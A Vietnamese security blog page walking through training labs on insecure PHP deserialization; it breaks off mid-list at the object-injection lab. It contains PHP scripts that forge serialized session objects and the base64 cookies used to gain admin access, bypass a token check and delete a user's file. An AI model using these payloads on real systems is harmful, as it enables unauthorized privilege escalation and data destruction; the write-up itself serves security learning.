

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Insecure deserialization lab - &gt; root@l3mnt2010:~# ./exploit.py</title>
  <meta name="description" content="Lab: Modifying serialized objects Lab: Modifying serialized data types Lab: Using application functionality to exploit insecure deserialization Lab: Arbitrary object injection in PHP Lab: Developing a custom gadget chain for PHP deserialization        .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.">
  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
    
    "url": "https:\/\/l3mnt2010.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/l3mnt2010.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/insecure-deserialization-lab\/",
          "name": "Insecure deserialization lab"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "Insecure deserialization lab",
  "description" : "Lab: Modifying serialized objects Lab: Modifying serialized data types Lab: Using application functionality to exploit insecure deserialization Lab: Arbitrary object injection in PHP Lab: Developing a custom gadget chain for PHP deserialization        \r\r\r\r\r.toc-container {\rposition: fixed;\rleft: 0;\rtop: 100px; width: 350px; max-height: 80vh;\roverflow-y: auto;\roverflow-x: auto;\rpadding: 20px;\rborder-right: 1px solid #eee;\rbackground-color: black; z-index: 100;\rtext-align: left; }\r.",
  "inLanguage" : "en",
  "wordCount":  2154 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese, Deserialize" ],
  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/insecure-deserialization-lab\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/l3mnt2010.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="Insecure deserialization lab" />
<meta property="og:description" content="Lab: Modifying serialized objects Lab: Modifying serialized data types Lab: Using application functionality to exploit insecure deserialization Lab: Arbitrary object injection in PHP Lab: Developing a custom gadget chain for PHP deserialization        .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.">
<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
<meta property="og:url" content="https://l3mnt2010.github.io/insecure-deserialization-lab/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />

  <meta name="twitter:title" content="Insecure deserialization lab" />
  <meta name="twitter:description" content="Lab: Modifying serialized objects Lab: Modifying serialized data types Lab: Using application functionality to exploit insecure deserialization Lab: Arbitrary object injection in PHP Lab: Developing a …">
  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
            </li>
          
        
          
            <li>
              <a title="Write-up" href="https://l3mnt2010.github.io/write-up">Write-up</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="posts-heading">
              
                <h1>Insecure deserialization lab</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        
  <div class="toc-container">
    <div class="toc">
      <nav id="TableOfContents">
        
        <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li>
          <ol>
            <li>
              <ol>
                <li><a href="#lab-modifying-serialized-objects">Lab: Modifying serialized objects</a></li>
                <li><a href="#lab-modifying-serialized-data-types">Lab: Modifying serialized data types</a></li>
                <li><a href="#lab-using-application-functionality-to-exploit-insecure-deserialization">Lab: Using application functionality to exploit insecure deserialization</a></li>
                <li><a href="#lab-arbitrary-object-injection-in-php">Lab: Arbitrary object injection in PHP</a></li>
                <li><a href="#lab-developing-a-custom-gadget-chain-for-php-deserialization">Lab: Developing a custom gadget chain for PHP deserialization</a></li>
              </ol>
            </li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
      </nav>
    </div>
  </div>

  <style>
     
    .toc-container {
      position: fixed;
      left: 0;
      top: 100px;  
      width: 350px;  
      max-height: 80vh;
      overflow-y: auto;
      overflow-x: auto;
      padding: 20px;
      border-right: 1px solid #eee;
      background-color: black;  
      z-index: 100;
      text-align: left;  
    }

    .toc {
      font-size: 2.6rem;  
      color: #fff;  
      text-align: left;  
    }

    .toc h4 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.6rem;  
      text-align: left;  
    }

     
    .toc ul, .toc ol {
      padding-left: 0;  
      margin: 0;
      list-style-type: none;
      text-align: left;  
    }

     
    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
      padding-left: 10px;
    }

    .toc li {
      padding: 10px 0;
      line-height: 1.6;
      text-align: left;  
    }

    .toc a {
      text-decoration: none;
      color: #fff;  
      display: block;
      text-align: left;  
      padding-left: 3px;  
      font-size: 1.5rem;  
      transition: color 0.2s;
    }

    .toc a:hover {
      color: #ffcc00;  
    }

     
    .toc a.active {
      color: #ffcc00;  
      font-weight: bold;
      border-left: 4px solid #ffcc00;  
      padding-left: 3px;  
      margin-left: -5px;
    }

     
    .main-content {
      margin-left: 380px;  
    }

     
    @media (max-width: 1200px) {
      .toc-container {
        width: 280px;  
      }
      .main-content {
        margin-left: 320px;
      }
    }

    @media (max-width: 900px) {
      .toc-container {
        position: static;
        width: 100%;
        max-height: none;
        border-right: none;
        border-bottom: 1px solid #eee;
        margin-bottom: 20px;
      }
      .main-content {
        margin-left: 0;
      }
    }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      
      function highlightTOC() {
        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
        const tocLinks = document.querySelectorAll('.toc a');

        if (headings.length === 0 || tocLinks.length === 0) return;

        let currentActiveIndex = -1;
        const scrollPosition = window.scrollY;

        for (let i = 0; i < headings.length; i++) {
          const heading = headings[i];
          const headingTop = heading.offsetTop - 100;
          const headingBottom = headingTop + heading.offsetHeight;

          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
            currentActiveIndex = i;
            break;
          }
        }

        tocLinks.forEach(link => link.classList.remove('active'));

        if (currentActiveIndex >= 0) {
          const currentHeading = headings[currentActiveIndex];
          const headingId = currentHeading.id;

          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
          if (correspondingLink) {
            correspondingLink.classList.add('active');

            const tocContainer = document.querySelector('.toc-container');
            const linkTop = correspondingLink.offsetTop;
            const containerScrollTop = tocContainer.scrollTop;
            const containerHeight = tocContainer.clientHeight;

            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
              tocContainer.scrollTop = linkTop - containerHeight / 2;
            }
          }
        }
      }

      highlightTOC();
      window.addEventListener('scroll', highlightTOC);
      window.addEventListener('resize', highlightTOC);

      const fragment = window.location.hash;
      if (fragment) {
        const element = document.querySelector(fragment);
        if (element) {
          element.scrollIntoView({ behavior: 'smooth' });

          const tocLinks = document.querySelectorAll('.toc a');
          tocLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === fragment) {
              link.classList.add('active');
            }
          });

          highlightTOC();
        }
      }

      const tocLinks = document.querySelectorAll('.toc a');
      tocLinks.forEach(link => {
        link.addEventListener('click', function(event) {
          const targetId = link.getAttribute('href').substring(1);
          const targetElement = document.getElementById(targetId);

          if (targetElement) {
            targetElement.scrollIntoView({ behavior: 'smooth' });

            tocLinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');

            history.pushState(null, null, `#${targetId}`);

            event.preventDefault();
          }
        });
      });
    });
  </script>  


<!-- raw HTML omitted -->
<p><em>Jannuary 17, 2024 04:00 PM ICT to Jannuary 17, 2024 04:00 PM ICT</em></p>
<!-- raw HTML omitted -->
<h4 id="lab-modifying-serialized-objects">Lab: Modifying serialized objects</h4>
<ul>
<li>
<p>Đề bài yêu cầu như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ryuOh7Y0T.png" alt="image"></p>
</li>
<li>
<p>Như ta thấy thì lab chứa lỗ hổng Insecure deserialization do đó dễ bị leo thang đặc quyền vào nhiệm vụ là ta đạt được quyền quản trị sau đó xóa carlos.</p>
</li>
<li>
<p>Let&rsquo;s go bắt đầu bài lab nào:</p>
</li>
<li>
<p>Đăng nhập với viewner:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rkFZa7KR6.png" alt="image"></p>
</li>
<li>
<p>Quan sát thấy có chức năng đổi email người dùng.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Hy4q67K0T.png" alt="image"></p>
</li>
<li>
<p>cơ bản thì không thấy gì nhưng mà để ý session:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Hy5367FR6.png" alt="image"></p>
</li>
<li>
<p>Server lại lưu phiên với serialize:</p>
</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="nv">$a</span><span class="o">=</span> <span class="s2">&#34;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d&#34;</span><span class="p">;</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>

<span class="nv">$b</span><span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>

<span class="nx">print_r</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="err">
</span><span class="err">------------------------------------------------------
</span><span class="err">-&gt; __PHP_Incomplete_Class Object
</span><span class="err">(
</span><span class="err">    [__PHP_Incomplete_Class_Name] =&gt; User
</span><span class="err">    [username] =&gt; wiener
</span><span class="err">    [admin] =&gt;
</span><span class="err">)
</span></code></pre></div><ul>
<li>
<p>Class chứa 2 thuộc tính là username và admin có vẻ đây là xét có phải admin hay không.</p>
</li>
<li>
<p>Bây giờ mình đánh cắp phiên <code>admin</code> bằng cách đổi admin thành <code>1</code>.</p>
</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
   <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span> 
   <span class="k">public</span>  <span class="nv">$admin</span><span class="p">;</span>
   <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$admin</span><span class="p">){</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">=</span> <span class="nv">$admin</span><span class="p">;</span>
   <span class="p">}</span>

<span class="p">}</span>

<span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;viewner&#34;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>

<span class="nv">$poc</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>

<span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>

<span class="c1">// $a= &#34;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d&#34;;
</span><span class="c1"></span>
<span class="c1">// $a = base64_decode($a);
</span><span class="c1"></span>
<span class="c1">// $b= unserialize($a);
</span><span class="c1"></span>
<span class="c1">// print_r($b);
</span><span class="c1"></span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><code>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=</code></p>
<ul>
<li>
<p><img src="https://hackmd.io/_uploads/Bycx7NF06.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ryYNmVKCa.png" alt="image"></p>
</li>
<li>
<p>Bây giờ thì xóa user <code>carlos</code> và solved bài lab:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/By4DmNY06.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/r1e_mEK0a.png" alt="image"></p>
</li>
</ul>
<h4 id="lab-modifying-serialized-data-types">Lab: Modifying serialized data types</h4>
<ul>
<li>
<p>Đề bài yêu cầu như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Bkuw4NtCa.png" alt="image"></p>
</li>
<li>
<p>Yêu cầu tương tự như bài trên là xóa <code>carlos</code> với tư cách quản trị viên.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Sk2FF4K06.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ryFnFVtCa.png" alt="image"></p>
</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="c1">// class User {
</span><span class="c1">//    public  $username; 
</span><span class="c1">//    public  $access_token;
</span><span class="c1">//    function __construct($username, $access_token){
</span><span class="c1">//       $this-&gt;username = $username;
</span><span class="c1">//       $this-&gt;access_token = $admin;
</span><span class="c1">//    }
</span><span class="c1"></span>
<span class="c1">// }
</span><span class="c1"></span>
<span class="c1">// $poc = new User(&#34;viewner&#34;, true);
</span><span class="c1"></span>
<span class="c1">// $poc = serialize($poc);
</span><span class="c1"></span>
<span class="c1">// echo base64_encode($poc);
</span><span class="c1"></span>
<span class="nv">$a</span><span class="o">=</span> <span class="s2">&#34;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJuNGF1ampocms1eHhyZzA0a3BrMmVzdXIzN3A0eWUzOCI7fQ==&#34;</span><span class="p">;</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>

<span class="nv">$b</span><span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>

<span class="nx">print_r</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="err">
</span><span class="err">
</span><span class="err">-----&gt;
</span><span class="err">__PHP_Incomplete_Class Object
</span><span class="err">(
</span><span class="err">    [__PHP_Incomplete_Class_Name] =&gt; User
</span><span class="err">    [username] =&gt; wiener
</span><span class="err">    [access_token] =&gt; n4aujjhrk5xxrg04kpk2esur37p4ye38
</span><span class="err">)
</span></code></pre></div><ul>
<li>ở đây khác với ở trên là check token thay vì boolean, nên mình sẽ thay <code>username</code> thành <code>administrator</code> nhưng đồng thời access-token được lose compare để mình sẽ khai khác type jugging.</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
   <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span> 
   <span class="k">public</span>  <span class="nv">$access_token</span><span class="p">;</span>
   <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$access_token</span><span class="p">){</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">access_token</span> <span class="o">=</span> <span class="nv">$access_token</span><span class="p">;</span>
   <span class="p">}</span>

<span class="p">}</span>

<span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;administrator&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

<span class="nv">$poc</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>

<span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>

<span class="c1">// $a= &#34;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJuNGF1ampocms1eHhyZzA0a3BrMmVzdXIzN3A0eWUzOCI7fQ==&#34;;
</span><span class="c1"></span>
<span class="c1">// $a = base64_decode($a);
</span><span class="c1"></span>
<span class="c1">// $b= unserialize($a);
</span><span class="c1"></span>
<span class="c1">// print_r($b);
</span></code></pre></div><p><code>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9</code></p>
<ul>
<li>
<p>Thay session và ta nhận được phiên admin</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/B14BNrKA6.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HJvwNrYRa.png" alt="image"></p>
</li>
<li>
<p>Truy cập admin và xóa <code>carlos</code> thui :-1:  hihi</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/H149ErtAa.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/SkQiVBY0T.png" alt="image"></p>
</li>
</ul>
<h4 id="lab-using-application-functionality-to-exploit-insecure-deserialization">Lab: Using application functionality to exploit insecure deserialization</h4>
<ul>
<li>
<p>Đề bài yêu cầu chúng ta như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HJye_rYRT.png" alt="image"></p>
</li>
<li>
<p>Có thể thấy bài lab yêu cầu chúng ta lợi dụng serialize để xóa file morale.txt nằm trong thư mục home của user carlos.</p>
</li>
<li>
<p>Bắt đầu thui nào:&gt;</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/S1e4tHKAT.png" alt="image"></p>
</li>
<li>
<p>Bài này có chức năng thay đổi email, upload avatar và xóa tài khoản bây giờ thử xóa thử xem nhưng ta bắt request nha:&gt;</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HJpYFHYAT.png" alt="image"></p>
</li>
<li>
<p>Khi mà xóa thì mình lại gửi 1 serial đã được base64 lên sever để xóa, lợi dụng thuộc tính avatar link để xóa dữ liệu lưu trữ trên sever nha.</p>
</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="nv">$a</span><span class="o">=</span> <span class="s2">&#34;Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvYjRuZmRmZTVodHZ3dXlrcG4wenlrYnZqaDY0NXV4dyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d&#34;</span><span class="p">;</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>

<span class="nv">$b</span><span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>

<span class="nx">print_r</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>

<span class="o">---&gt;</span> 
<span class="nx">__PHP_Incomplete_Class</span> <span class="nx">Object</span>
<span class="p">(</span>
    <span class="p">[</span><span class="nx">__PHP_Incomplete_Class_Name</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">User</span>
    <span class="p">[</span><span class="nx">username</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">wiener</span>
    <span class="p">[</span><span class="nx">access_token</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">ob4nfdfe5htvwuykpn0zykbvjh645uxw</span>
    <span class="p">[</span><span class="nx">avatar_link</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">users</span><span class="o">/</span><span class="nx">wiener</span><span class="o">/</span><span class="nx">avatar</span>
<span class="p">)</span>

<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><ul>
<li>Bây giờ ta sẽ tạo lại object User này.</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
   <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span> 
   <span class="k">public</span>  <span class="nv">$access_token</span><span class="p">;</span>
   <span class="k">public</span> <span class="nv">$avatar_link</span><span class="p">;</span>
   <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$access_token</span><span class="p">,</span><span class="nv">$avatar_link</span><span class="p">){</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">access_token</span> <span class="o">=</span> <span class="nv">$access_token</span><span class="p">;</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">avatar_link</span> <span class="o">=</span> <span class="nv">$avatar_link</span><span class="p">;</span>
   <span class="p">}</span>

<span class="p">}</span>

<span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;viewner&#34;</span><span class="p">,</span> <span class="s2">&#34; ob4nfdfe5htvwuykpn0zykbvjh645uxw&#34;</span><span class="p">,</span> <span class="s2">&#34;/home/carlos/morale.txt&#34;</span><span class="p">);</span>

<span class="nv">$poc</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>

<span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>

<span class="c1">// $a= &#34;Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvYjRuZmRmZTVodHZ3dXlrcG4wenlrYnZqaDY0NXV4dyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d&#34;;
</span><span class="c1"></span>
<span class="c1">// $a = base64_decode($a);
</span><span class="c1"></span>
<span class="c1">// $b= unserialize($a);
</span><span class="c1"></span>
<span class="c1">// print_r($b);
</span><span class="c1"></span>
<span class="nx">Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvYjRuZmRmZTVodHZ3dXlrcG4wenlrYnZqaDY0NXV4dyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><ul>
<li>
<p>Gửi session để delete và solved bài lab.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/SkTgjrYR6.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Byo2iHFRp.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HkBTjBFR6.png" alt="image"></p>
</li>
</ul>
<h4 id="lab-arbitrary-object-injection-in-php">Lab: Arbitrary object injection in PHP</h4>
<ul>
<li>
<p>Đề bài cho chúng ta như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ByV82HFAp.png" alt="image"></p>
</li>
<li>
<p>Yêu cầu vẫn là xóa file morale.txt từ carlos trên sever.</p>
</li>
<li>
<p>Bắt đầu bài lab thui.</p>
</li>
<li>
